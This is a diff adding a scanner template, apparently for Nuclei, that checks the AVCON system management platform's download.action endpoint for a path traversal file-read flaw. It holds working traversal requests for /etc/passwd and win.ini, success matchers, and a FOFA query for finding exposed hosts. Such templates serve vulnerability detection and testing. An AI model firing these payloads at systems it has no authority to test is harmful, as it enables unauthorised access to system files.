@@ -1,0 +1,29 @@
+id: avcon-download-action-lfi
+info:
+  name: AVCON 系统管理平台 download.action - 任意文件读取漏洞
+  author: leadlife
+  severity: high
+  description: AVCON-系统管理平台download.action存在任意文件读取漏洞，通过该漏洞读取配置文件信息，造成信息泄露漏洞
+  reference: 
+    - https://github.com/wy876/POC/blob/c19942e30121f116548ca14c0375ba6c8560afeb/AVCON-%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0download.action%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: title="AVCON-系统管理平台"
+  tags: avcon,lfi
+
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/download.action?filename=../../../../../../../../etc/passwd"
+      - "{{BaseURL}}/download.action?filename=../../../../../../../../c:/windows/win.ini"
+
+    stop-at-first-match: true
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "root:.*:0:0:"
+          - "\\[(font|extension|file)s\\]"
+        condition: or
